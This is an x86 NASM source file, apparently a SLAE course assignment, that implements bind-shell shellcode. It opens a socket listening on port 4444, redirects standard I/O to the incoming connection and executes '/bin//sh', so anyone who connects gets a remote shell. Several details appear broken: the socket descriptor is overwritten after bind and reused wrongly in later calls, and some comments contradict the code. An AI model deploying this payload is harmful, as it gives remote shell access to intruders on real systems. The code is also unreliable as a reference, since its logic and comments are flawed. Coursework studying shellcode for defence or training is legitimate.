;Program: Tcp_Bind_Shell.nasm
;Author : Bhanu Teja
;SLAE-1426

global _start

section .text
_start:

;
;setting all the registers to 0
;

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;
;Creating a socket: socket(AF_INET, SOCK_STREAM, IP_PROTO_IP)
;

mov al, 0x66 	; socket syscall 102 | Hex equivalent is 0x66
mov bl, 0x1  	; socket syscall function SOCKET is 1 | #define SYS_SOCKET 1 

;
; we need to push AF_INET, SOCK_STREAM, IP_PROTO as a single argument. This can be done by pushing them onto stack in the reverse order
;

push ecx     	; ecx value is zero and is pushed onto the stack as value for IP_PORTO_IP
push ebx	     	; ebx value is 1 and is pushed onto stack as value for SOCK_STREAM
push 0x2     	; AF_INET value is 2 and is pushed on to the stack
mov ecx, esp 	; esp is pushed into ecx and now points to arguments
int 0x80     	; execute

;
;Binding the socket: bind(host_sock, (sin.family=AF_INET, sin_port=4444, sin_addr=0.0.0.0), sizeof(host_addr));
;

mov edi, eax 	; sockfd is now moved into edi
mov al, 0x66 	; socket syscall 102 | Hex equivalent is 0x66
mov bl, 0x2	; socket syscall function BIND is 2 | #define SYS_BIND 2
xor edx, edx	; zeroing edx
push edx	; edx onto the stack for host_addr INADDR_ANY = 0
push 0x5c11; sin.port=4444 | hex equivalent is 0x115c => 0x5c11 Little Endian
push ebx	; AF_INET value is 2
mov ecx, esp	; ecx points to args
push 0x10	; sizeof host
push ecx	; push address onto stack
push edi	; edi has the sockfd
mov ecx, esp	; point ecx to top of stack
int 0x80	; execute

;
;Creating a listener
;
mov edi, eax	; sockfd moved into edi
mov al, 0x66	;
mov bl, 0x4	; socket syscall function LISTEN is 3 | #define SYS_LISTEN 4
xor edx, edx	; zeroing edx
push edx
push edi	; edi has the sockfd onto stack
mov ecx, esp
int 0x80

;
;Accept connection
;

mov edi, eax	;
mov al,0x66	;
mov bl,0x5	;
push edx	;
push edx	;
push edi	;
mov ecx, esp	;
int 0x80	;

;
;send and recevie data using I/O fd's
;

xchg ebx, eax	; moved the client connection fd into edi
xor ecx, ecx
mov cl, 0x0	; set loop counter

loop:
	mov al, 0x3f	; dup2 value 63 | Hex eqivalent is 0x3f
	int 0x80	; execute 
	inc cl		; increment cl
	cmp cl, 0x4	; comapre if cl is eql to 4
	jne loop	; if not equal jmp to loop

;
;Execute shellcode
;

xor edx, edx	; edx is 0
push edx	; push 0 onto stack null terminator
mov eax, 0xb	; execve 11 | Hex is 0xb
push 0x68732f2f	; 
push 0x6e69622f	;
mov ebx, esp	; ebx points to top of stack
mov ecx, edx	; ecx = edx = 0
int 0x80

